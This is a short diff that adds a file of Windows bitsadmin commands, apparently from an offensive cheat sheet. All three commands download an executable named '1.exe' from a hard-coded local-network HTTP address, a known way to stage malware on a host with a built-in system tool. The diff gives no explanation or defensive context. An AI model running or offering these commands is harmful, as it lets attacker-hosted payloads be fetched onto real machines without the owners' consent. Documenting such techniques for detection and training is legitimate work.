@@ -1,0 +1,4 @@
+bitsadmin /rawreturn /transfer down "http://192.168.43.111/1.exe" 1.exe
+bitsadmin /setpriority down foreground
+
+bitsadmin /transfer down /download /priority normal "http://192.168.43.111/1.exe" 1.exe
